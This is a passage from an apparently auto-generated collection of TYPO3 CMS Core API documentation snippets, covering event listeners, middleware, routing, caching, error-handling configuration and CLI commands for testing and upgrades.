message',\n                /* unique error code */\n            );\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a Custom File Processor Class in PHP for TYPO3 CMS\nDESCRIPTION: This snippet outlines the structure of a custom file processor class in TYPO3 CMS. The class must implement the ProcessorInterface and include two required methods: canProcessTask() and processTask().\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/FileProcessing/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\npublic function canProcessTask()\n{\n    // Decide whether the given file should be handled\n    // Return type: boolean\n}\n\npublic function processTask()\n{\n    // Process the given file\n}\n```\n\n----------------------------------------\n\nTITLE: Service with Feature Toggle Injection in TYPO3\nDESCRIPTION: Example of injecting feature toggle status using autowiring.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/DependencyInjection/Index.rst#2025-04-16_snippet_11\n\nLANGUAGE: php\nCODE:\n```\nclass MyServiceGettingFeatureToggleResultInjected {\n    public function __construct(\n        #[Autowire(expression: \"service('TYPO3\\\\CMS\\\\Core\\\\Configuration\\\\Features').isFeatureEnabled('someFeature')\")]\n        private readonly bool $featureEnabled\n    ) {}\n}\n```\n\n----------------------------------------\n\nTITLE: Retrieving All Cache Tags in TYPO3 CMS (PHP)\nDESCRIPTION: This code shows how to get all cache tags that have been registered with the frontend cache collector. The getCacheTags method returns all registered cache tags.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/RequestLifeCycle/RequestAttributes/FrontendCacheCollector.rst#2025-04-16_snippet_5\n\nLANGUAGE: php\nCODE:\n```\n$cacheDataCollector = $request->getAttribute('frontend.cache.collector');\n$cacheDataCollector->getCacheTags();\n```\n\n----------------------------------------\n\nTITLE: Disabling and Reregistering Middlewares in TYPO3\nDESCRIPTION: This snippet shows how to disable an existing middleware to avoid circular ordering dependencies, allowing it to be reregistered with a new identifier and specific ordering configuration.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/RequestLifeCycle/Middlewares.rst#2025-04-16_snippet_5\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\n\nreturn [\n    'frontend' => [\n        'typo3/cms-frontend/tsfe' => [\n            'disabled' => true\n        ]\n    ]\n];\n```\n\n----------------------------------------\n\nTITLE: Releasing Events in TYPO3 JavaScript Event API\nDESCRIPTION: Demonstrates how to properly release (detach) an event listener using the JavaScript Event API. The example creates a RegularEvent instance stored in a variable, then later calls release() to detach the event listener.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/JavaScript/EventApi/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\nimport RegularEvent from '@typo3/core/event/regular-event.js';\n\nconst clickEvent = new RegularEvent('click', function(e) {\n  // Your code\n}).bindTo(document.querySelector('.my-button'));\n\n// Later in your code\nclickEvent.release();\n```\n\n----------------------------------------\n\nTITLE: Stopping Request Processing with PropagateResponseException\nDESCRIPTION: This code snippet demonstrates how to stop further request processing in an Extbase controller action by throwing a `\\TYPO3\\CMS\\Core\\Http\\PropagateResponseException`. This exception is caught by a PSR-15 middleware, which then returns the given PSR-7 response directly, preventing further TYPO3 processing.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/Controller/ActionController.rst#2025-04-16_snippet_6\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Controller;\n\nuse Psr\\Http\\Message\\ResponseInterface;\nuse TYPO3\\CMS\\Core\\Http\\PropagateResponseException;\nuse TYPO3\\CMS\\Extbase\\Mvc\\Controller\\ActionController;\n\nfinal class MyController extends ActionController\n{\n    /**\n     * @return ResponseInterface\n     */\n    public function downloadAction(): ResponseInterface\n    {\n        // Do something\n        $response = $this->responseFactory->createResponse();\n        // Do something with the response\n\n        throw new PropagateResponseException($response);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Error Handler Properties in TYPO3 CMS\nDESCRIPTION: This snippet outlines the configuration properties for error handlers in TYPO3 CMS. It includes the 'errorCode' and 'errorHandler' options with their types and examples.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SiteHandling/ErrorHandling/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n..  option:: errorCode\n\n    :type: int\n    :Example: `404`\n\n    The `HTTP (error) status code`_ to handle. The predefined list contains the\n    most common errors. A free definition of other error codes is also possible.\n    The special value `0` will take care of all errors.\n\n    ..  _HTTP (error) status code: https://developer.mozilla.org/en-US/docs/Web/HTTP/Status\n\n\n.. _sitehandling-errorHandling_errorHandler:\n\n..  option:: errorHandler\n\n    :type: string / enum\n    :Example: `Fluid`\n\n    Define how to handle these errors:\n\n    *   :ref:`Fluid <sitehandling-errorHandling_fluid>` for rendering a Fluid\n        template\n    *   :ref:`Page <sitehandling-errorHandling_page>` for fetching content from\n        a page\n    *   :ref:`PHP <sitehandling-customErrorHandler>` for a custom\n        implementation\n```\n\n----------------------------------------\n\nTITLE: Configuring cHash Parameters in TYPO3\nDESCRIPTION: Example configuration for customizing cHash behavior by defining excluded parameters and parameters that should be excluded when empty. This configuration is placed in the system's additional configuration file.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/CachingFramework/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['FE']['cacheHash'] = [\n    'excludedParameters' => [\n        'utm_source',\n        'utm_medium',\n    ],\n    'excludedParametersIfEmpty' => [\n        '^tx_my_plugin[aspects]',\n        'tx_my_plugin[filter]',\n    ],\n];\n```\n\n----------------------------------------\n\nTITLE: Codeception Configuration for Acceptance Tests\nDESCRIPTION: This YAML configuration file initializes Codeception for running acceptance tests in the TYPO3 project. It specifies paths, modules, and logging configurations required for Codeception to interact with the Selenium Chrome container and the project.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Testing/Tutorial/Acceptance.rst#2025-04-16_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nnamespace: Bk2k\\SiteIntroduction\\Tests\\Acceptance\\Support\nsuites:\n  acceptance:\n    actor: AcceptanceTester\n    path: .\n    modules:\n      enabled:\n        - Asserts\n        - WebDriver:\n            url: https://introduction.ddev.site\n            browser: chrome\n            host: ddev-introduction-chrome\n            wait: 1\n            window_size: 1280x1024\nextensions:\n  enabled:\n    - Codeception\\Extension\\RunFailed\n    - Codeception\\Extension\\Recorder\n\npaths:\n  tests: Acceptance\n  output: ../var/log/_output\n  data: .\n  support: Acceptance/Support\n\nsettings:\n  shuffle: false\n  lint: true\n  colors: true\n```\n\n----------------------------------------\n\nTITLE: Running PHPUnit Tests on Host System\nDESCRIPTION: Command to execute unit tests directly on the host system using PHPUnit. This requires the proper PHP version to be installed on the system.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Testing/UnitTesting/Running.rst#2025-04-16_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\nphp vendor/bin/phpunit -c Build/phpunit/UnitTests.xml\n```\n\n----------------------------------------\n\nTITLE: Configuring Error Display in Apache .htaccess for Production\nDESCRIPTION: Apache .htaccess configuration for production environments that disables frontend error display but maintains error logging. This helps hide system internals from users while still capturing errors for administrators.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ErrorAndExceptionHandling/Examples/Index.rst#2025-04-16_snippet_4\n\nLANGUAGE: apacheconf\nCODE:\n```\nphp_flag display_errors off\nphp_flag log_errors on\nphp_value error_log /path/to/php_error.log\n```\n\n----------------------------------------\n\nTITLE: Accessing Extension Configuration via API\nDESCRIPTION: Demonstrates how to access extension configuration values using the `ExtensionConfiguration` API in PHP. It retrieves the entire configuration array using constructor injection. The configuration is stored in `$GLOBALS['TYPO3_CONF_VARS']['EXTENSIONS']['my_extension_key']`.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/FileStructure/ExtConfTemplate.rst#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\n\"<?php\\n\\nnamespace Vendor\\\\MyExtension\\\\Classes;\\n\\nuse TYPO3\\\\CMS\\\\Core\\\\Configuration\\\\ExtensionConfiguration;\\nuse Psr\\\\Http\\\\Message\\\\ServerRequestInterface;\\n\\nclass MyClass\\n{\\n    /**\\n     * @var array\\n     */\\n    protected array $extensionConfiguration;\\n\\n    /**\\n     * @param ExtensionConfiguration $extensionConfiguration\\n     */\\n    public function __construct(\\n        ExtensionConfiguration $extensionConfiguration\\n    ) {\\n        $this->extensionConfiguration = $extensionConfiguration->get('my_extension');\\n    }\\n\\n    public function doSomething(): array\\n    {\\n        return $this->extensionConfiguration;\\n    }\\n}\\n\"\n```\n\n----------------------------------------\n\nTITLE: Accessing AfterFolderDeletedEvent Methods in TYPO3 CMS\nDESCRIPTION: The AfterFolderDeletedEvent class provides two methods: getFolder() returns the folder object that was deleted, and isDeleted() returns a boolean indicating whether the folder was successfully deleted.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/Resource/AfterFolderDeletedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n..  php:method:: getFolder()\n    :returns: `\\TYPO3\\CMS\\Core\\Resource\\Folder`\n\n..  php:method:: isDeleted()\n    :returns: `bool`\n```\n\n----------------------------------------\n\nTITLE: Setting Registry Entries in TYPO3 CMS (PHP)\nDESCRIPTION: The set() method stores a persistent entry in the registry. It takes a namespace, a key, and a value. The value can be any PHP data type, as the class handles serialization. It's not recommended to store binary data using this method.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Manual/Registry/Registry.rst.txt#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\nset(?string $namespace, ?string $key, ?mixed $value)\n```\n\n----------------------------------------\n\nTITLE: Defining AfterPackageActivationEvent Class in TYPO3 CMS Core API (PHP)\nDESCRIPTION: This code snippet defines the AfterPackageActivationEvent class in the TYPO3\\CMS\\Core\\Package\\Event namespace. The class represents an event that is triggered after a package has been activated in TYPO3 CMS.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/AfterPackageActivationEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n..  php:namespace::  TYPO3\\CMS\\Core\\Package\\Event\n\n..  php:class:: AfterPackageActivationEvent\n\n    Event that is triggered after a package has been activated\n\n    ..  php:method:: getPackageKey()\n        :returns: `string`\n\n    ..  php:method:: getType()\n        :returns: `string`\n\n    ..  php:method:: getEmitter()\n        :returns: `?object`\n```\n\n----------------------------------------\n\nTITLE: Implementing an Event Listener for EnhanceStdWrapEvent in TYPO3\nDESCRIPTION: Example of an event listener implementation that hooks into the TYPO3 Frontend's EnhanceStdWrapEvent. This allows for modification of the stdWrap processing to enhance functionality and manipulate the final content.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Frontend/EnhanceStdWrapEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Frontend\\EventListener;\n\nuse TYPO3\\CMS\\Frontend\\ContentObject\\Event\\EnhanceStdWrapEvent;\n\nfinal class MyEventListener\n{\n    public function __invoke(EnhanceStdWrapEvent $event): void\n    {\n        $content = $event->getContent();\n        $configuration = $event->getConfiguration();\n        $contentObjectRenderer = $event->getContentObjectRenderer();\n\n        // Do something with the content\n        $content .= ' My Enhanced Content';\n\n        // Set modified content back to the event\n        $event->setContent($content);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing GitHub Link Handler in TYPO3\nDESCRIPTION: A PHP class that implements TYPO3's LinkHandlerInterface to handle GitHub-specific links. The handler checks if the link type is 'github' and stores the URL parts for processing.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/LinkHandling/Tutorials/_CustomLinkBrowser/_GitHubLinkHandlerCanHandleLink.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nclass GitHubLinkHandler implements LinkHandlerInterface\n{\n    public function canHandleLink(array $linkParts): bool\n    {\n        if ($linkParts['type'] !== 'github') {\n            return false;\n        }\n        $this->linkParts = $linkParts['url'] ?? [];\n        return true;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining the BeforeStdWrapFunctionsExecutedEvent class in TYPO3 CMS Frontend\nDESCRIPTION: Documentation of the BeforeStdWrapFunctionsExecutedEvent class that provides hooks into TYPO3's content rendering process. The class includes methods for getting and setting content, retrieving configuration, and accessing the ContentObjectRenderer instance.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Frontend/BeforeStdWrapFunctionsExecutedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace  TYPO3\\CMS\\Frontend\\ContentObject\\Event\n\nclass BeforeStdWrapFunctionsExecutedEvent\n{\n    // Event is called directly after the recursive stdWrap function call but still before the content gets modified\n\n    public function getContent(): ?string\n    {\n        // Returns the current content\n    }\n\n    public function setContent(string $content)\n    {\n        // Sets the content to be processed\n    }\n\n    public function getConfiguration(): array\n    {\n        // Returns the configuration array\n    }\n\n    public function getContentObjectRenderer(): \\TYPO3\\CMS\\Frontend\\ContentObject\\ContentObjectRenderer\n    {\n        // Returns the ContentObjectRenderer instance\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: getFiltered() Method\nDESCRIPTION: Retrieves a filtered list of countries based on a provided filter object. The method takes a `CountryFilter` object as input and returns an array of `Country` objects that match the filter criteria.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Manual/Country/CountryProvider.rst.txt#2025-04-16_snippet_6\n\nLANGUAGE: PHP\nCODE:\n```\n..  php:method:: getFiltered(\\TYPO3\\CMS\\Core\\Country\\CountryFilter $filter)\n        :returns: `array<string,\\Country>`\n\n        :param $filter: the filter\n```\n\n----------------------------------------\n\nTITLE: Setting JPEG Quality for Image Generation\nDESCRIPTION: This configuration specifies the default quality for JPEG image generation in TYPO3. The value ranges from 1 (lowest quality) to 100 (highest quality), allowing developers to find a balance between image quality and file size.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/GFX.rst#2025-04-16_snippet_5\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['GFX']['jpg_quality'] = 85;\n```\n\n----------------------------------------\n\nTITLE: Implementing ModifyDatabaseQueryForRecordListingEvent Listener in TYPO3\nDESCRIPTION: Code example showing the implementation of an event listener for ModifyDatabaseQueryForRecordListingEvent in TYPO3 CMS. This event allows modification of the query builder before records are listed in the backend.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Backend/ModifyDatabaseQueryForRecordListingEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n\\TYPO3\\CMS\\Backend\\View\\Event\\ModifyDatabaseQueryForRecordListingEvent\n```\n\n----------------------------------------\n\nTITLE: Creating TYPO3 Backend Users via Console Command in DDEV Environment\nDESCRIPTION: Command for creating a new backend user in TYPO3 when using DDEV as development environment. This initiates an interactive prompt that guides you through the user creation process.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/UserManagement/UserSetup/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nddev typo3 typo3 backend:user:create\n```\n\n----------------------------------------\n\nTITLE: Initializing LanguageService in TYPO3 Backend\nDESCRIPTION: Creates a new LanguageService instance from user preferences in the TYPO3 backend context.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Localization/LocalizationApi/_LanguageService.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$languageService = GeneralUtility::makeInstance(LanguageServiceFactory::class)\\n    ->createFromUserPreferences($GLOBALS['BE_USER']);\n```\n\n----------------------------------------\n\nTITLE: Defining a Simple Backend Groups Hierarchy Using PlantUML\nDESCRIPTION: This PlantUML diagram illustrates a backend groups hierarchy with 2 levels of inheritance. The diagram is used to demonstrate a recommended approach for organizing TYPO3 backend user permissions with a flat structure.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/PermissionsManagement/GroupsInheritance/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: plantuml\nCODE:\n```\n_simple-groups-inheritance.plantuml\n```\n\n----------------------------------------\n\nTITLE: Running Unit Tests for TYPO3 Styleguide Extension\nDESCRIPTION: Shell commands to clone the TYPO3 styleguide repository, update composer dependencies, and run unit tests using the runTests.sh script.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Testing/Tutorial/Enetcache.rst#2025-04-16_snippet_9\n\nLANGUAGE: shell\nCODE:\n```\ngit clone git@github.com:TYPO3/styleguide.git\ncd styleguide\nBuild/Scripts/runTests.sh -s composerUpdate\n# Run unit tests\nBuild/Scripts/runTests.sh\n# ... OK (1 test, 4 assertions)\n```\n\n----------------------------------------\n\nTITLE: Fluid Template Location for Content Elements (HTML)\nDESCRIPTION: Depicts the location for overriding or extending Fluid-Styled Content elements. Templates are usually stored in `/Resources/Private/ContentElements/Pages/` and the `styles.templates.templateRootPath` TypoScript setting needs to be configured.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/FileStructure/Resources/Private/Index.rst#2025-04-16_snippet_6\n\nLANGUAGE: HTML\nCODE:\n```\n\"/Resources/Private/ContentElements/Pages/SomeContentElement.html\"\n```\n\n----------------------------------------\n\nTITLE: Configuring TYPO3 Error Handling for Performance Optimization in PHP\nDESCRIPTION: PHP configuration that completely disables error and exception handling to maximize performance. This setup removes error handling overhead but eliminates the ability to track issues. Use only in specific high-performance scenarios.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ErrorAndExceptionHandling/Examples/Index.rst#2025-04-16_snippet_5\n\nLANGUAGE: php\nCODE:\n```\n$changeSettings['SYS'] = [\n  'displayErrors' => 0,\n  'devIPmask' => '',\n  'errorHandler' => '',\n  'debugExceptionHandler' => '',\n  'productionExceptionHandler' => '',\n  'belogErrorReporting' => '0',\n];\n\n$GLOBALS['TYPO3_CONF_VARS'] = array_replace_recursive($GLOBALS['TYPO3_CONF_VARS'], $changeSettings);\n```\n\n----------------------------------------\n\nTITLE: Defining AfterTypoLinkDecodedEvent Class in TYPO3 Core API (PHP)\nDESCRIPTION: This snippet defines the AfterTypoLinkDecodedEvent class in the TYPO3\\CMS\\Core\\LinkHandling\\Event namespace. The class provides methods for manipulating and retrieving TypoLink parts and related information.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/LinkHandling/AfterTypoLinkDecodedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\nnamespace TYPO3\\CMS\\Core\\LinkHandling\\Event;\n\nclass AfterTypoLinkDecodedEvent\n{\n    public function getTypoLinkParts(): array\n    {\n        // Implementation not shown\n    }\n\n    public function setTypoLinkParts(array $typoLinkParts): void\n    {\n        // Implementation not shown\n    }\n\n    public function getTypoLink(): string\n    {\n        // Implementation not shown\n    }\n\n    public function getDelimiter(): string\n    {\n        // Implementation not shown\n    }\n\n    public function getEmptyValueSymbol(): string\n    {\n        // Implementation not shown\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Migrating GravatarViewHelper: Removing registerTagAttribute (PHP)\nDESCRIPTION: Example of migrating a GravatarViewHelper by removing the registerTagAttribute call and adapting to use additionalArguments instead of arguments.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fluid/DevelopCustomViewhelper.rst#2025-04-16_snippet_3\n\nLANGUAGE: PHP\nCODE:\n```\n..  literalinclude:: _CustomViewHelper/_GravatarViewHelper13.diff\n    :caption: EXT:my_extension/Classes/ViewHelpers/GravatarViewHelper.php\n```\n\n----------------------------------------\n\nTITLE: PHP Method Definition: ExpressionBuilder::leftPad\nDESCRIPTION: Method for generating database-compatible left-padding expressions. Takes a value to pad, desired length, padding character, and optional AS identifier. Returns a platform-compatible left-pad expression string.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/ExpressionBuilder/_ExpressionBuilderLeftPad.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\npublic function leftPad(string $value, string|int $length, string $paddingValue, string $asIdentifier = ''): string\n```\n\n----------------------------------------\n\nTITLE: Creating Custom Wizard Command Handler in TYPO3\nDESCRIPTION: Implementation of a command class that handles wizard creation with input validation and interactive prompts. The command prevents creation of 'Wizard of Oz' unless forced, and allows for default naming fallback to 'Lord Voldermort' if no name is provided.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Tutorials/Command/Classes/CreateWizardCommandIo.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nuse Symfony\\Component\\Console\\Style\\SymfonyStyle;\nuse T3docs\\Examples\\Exception\\InvalidWizardException;\n\nfinal class CreateWizardCommand extends Command\n{\n    private function doMagic(\n        SymfonyStyle $io,\n        mixed $wizardName,\n        bool $bruteForce,\n    ): void {\n        $io->comment('Trying to create wizard ' . $wizardName . '...');\n        if ($wizardName === null) {\n            $wizardName = (string)$io->ask(\n                'Enter the wizard\\'s name (e.g. \"Gandalf the Grey\")',\n                'Lord Voldermort',\n            );\n        }\n        if (!$bruteForce && $wizardName === 'Oz') {\n            $io->error('The Wizard of Oz is not allowed. Use --brute-force to allow it.');\n            throw new InvalidWizardException();\n        }\n        $io->success('The wizard ' . $wizardName . ' was created');\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Page ID Selector in CKEditor Configuration\nDESCRIPTION: This snippet shows how to enable the page ID selector in the CKEditor link button configuration using YAML. This allows users to directly enter page UIDs when creating links in the rich text editor.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/LinkHandling/Configuration.rst#2025-04-16_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nbuttons:\n  link:\n    pageIdSelector:\n      enabled: true\n```\n\n----------------------------------------\n\nTITLE: Full Project Routing Configuration Example in TYPO3 CMS\nDESCRIPTION: This YAML configuration provides a comprehensive routing setup for a TYPO3 CMS project, including various extensions and custom mappers.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Routing/Examples.rst#2025-04-16_snippet_9\n\nLANGUAGE: yaml\nCODE:\n```\nrouteEnhancers:\n  PageTypeSuffix:\n    type: PageType\n    default: ''\n    index: 'index'\n    map:\n      'sitemap.xml': 1533906435\n\n  NewsDetailView:\n    type: Extbase\n    extension: News\n    plugin: Pi1\n    routes:\n      - { routePath: '/{news_title}', _controller: 'News::detail', _arguments: {'news_title': 'news'} }\n    defaultController: 'News::detail'\n    aspects:\n      news_title:\n        type: PersistedAliasMapper\n        tableName: tx_news_domain_model_news\n        routeFieldName: path_segment\n\n  ProjectsPlugin:\n    type: Extbase\n    limitToPages: [9]\n    extension: WirSpecialOffer\n    plugin: Projectlist\n    routes:\n      - { routePath: '/{category}', _controller: 'Project::list', _arguments: {'category': 'category'} }\n      - { routePath: '/{category}/{projects}', _controller: 'Project::list', _arguments: {'category': 'category', 'projects': 'projects'} }\n    requirements:\n      category: '[a-zA-Z0-9-]+'\n      projects: '[0-9]+'\n    defaultController: 'Project::list'\n    defaults:\n      category: ''\n      projects: '1'\n    aspects:\n      category:\n        type: PersistedPatternMapper\n        tableName: tx_wirspecialoffer_domain_model_category\n        routeFieldPattern: '^(?P<slug>.+)$'\n        routeFieldResult: '{slug}'\n      projects:\n        type: StaticRangeMapper\n        start: '1'\n        end: '100'\n\n  VariantPlugin:\n    type: Extbase\n    limitToPages: [7]\n    extension: WirSpecialOffer\n    plugin: Variant\n    routes:\n      - { routePath: '/{kategorie}/{variante}', _controller: 'Variant::show', _arguments: {'kategorie': 'kategorie', 'variante': 'variant'} }\n    requirements:\n      kategorie: '[a-zA-Z]+'\n      variante: '[a-zA-Z0-9-]+'\n    defaultController: 'Variant::show'\n    aspects:\n      kategorie:\n        type: StaticValueMapper\n        map:\n          platten: 'Platten'\n          terrassen: 'Terrassen'\n          baeume: 'Bäume'\n          fassaden: 'Fassaden'\n      variante:\n        type: PersistedPatternMapper\n        tableName: tx_wirspecialoffer_domain_model_variant\n        routeFieldPattern: '^(?P<slug>.+)$'\n        routeFieldResult: '{slug}'\n```\n\n----------------------------------------\n\nTITLE: Parsing Fields for Links in BeforeRecordIsAnalyzedEvent\nDESCRIPTION: This PHP code snippet shows how to use the SoftReferenceParserFactory to find and parse links in the configured fields of the current record being analyzed.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Linkvalidator/BeforeRecordIsAnalyzedEvent.rst#2025-04-16_snippet_3\n\nLANGUAGE: PHP\nCODE:\n```\nforeach ($fieldsToCheck as $field) {\n    if (!isset($record[$field])) {\n        continue;\n    }\n    $parserResult = $this->softReferenceParserFactory->getParserFor('typolink');\n    if ($parserResult === null) {\n        continue;\n    }\n    $parserResult->parse($table, $field, $uid, $record[$field]);\n    foreach ($parserResult->getMatchedElements() as $element) {\n        // Process each matched element\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Simple Fluid Layout for TYPO3 Backend Module\nDESCRIPTION: This code shows a minimal Fluid layout file for backend modules that only renders the 'Content' section, relying on ModuleTemplate to handle the surrounding backend interface.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/BackendModule/CreateModuleWithExtbase.rst#2025-04-16_snippet_2\n\nLANGUAGE: html\nCODE:\n```\n<f:render section=\"Content\" />\n```\n\n----------------------------------------\n\nTITLE: Implementing Page Tree Sorting with AfterRawPageRowPreparedEvent in TYPO3 CMS PHP\nDESCRIPTION: This example shows how to create an event listener that sorts pages by title in the TYPO3 page tree. The listener implements the AfterRawPageRowPreparedEvent to modify how pages are ordered when displayed in the backend.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Backend/AfterRawPageRowPreparedEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Backend\\EventListener;\n\nuse TYPO3\\CMS\\Backend\\Tree\\Repository\\AfterRawPageRowPreparedEvent;\n\nfinal class MyEventListener\n{\n    public function __invoke(AfterRawPageRowPreparedEvent $event): void\n    {\n        $pageRow = $event->getPageRow();\n        $children = $event->getChildren();\n\n        // Sort children by title\n        if (!empty($children)) {\n            usort($children, static function (array $a, array $b): int {\n                return strnatcasecmp($a['title'], $b['title']);\n            });\n            $event->setChildren($children);\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Running TYPO3 Upgrade Commands via CLI\nDESCRIPTION: CLI commands for running TYPO3 upgrade wizards in Composer mode, including listing status and executing specific or all wizards.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Upgrade/Major/PostupgradeTasks/UpgradeWizard.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n./vendor/bin/typo3 upgrade:list -a\n```\n\nLANGUAGE: bash\nCODE:\n```\n./vendor/bin/typo3 upgrade:run <wizardName>\n```\n\nLANGUAGE: bash\nCODE:\n```\n./vendor/bin/typo3 upgrade:run\n```\n\n----------------------------------------\n\nTITLE: Adding JavaScript Modules in FormEngine Container for TYPO3 CMS in PHP\nDESCRIPTION: Demonstrates how to add JavaScript ES6 modules to a FormEngine container. This is the recommended way to add JavaScript resources, as it works correctly with both standard and Ajax rendering contexts.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/FormEngine/Rendering/Index.rst#2025-04-16_snippet_5\n\nLANGUAGE: php\nCODE:\n```\n<?php\nnamespace MyVendor\\MyExtension\\Backend;\n\nuse 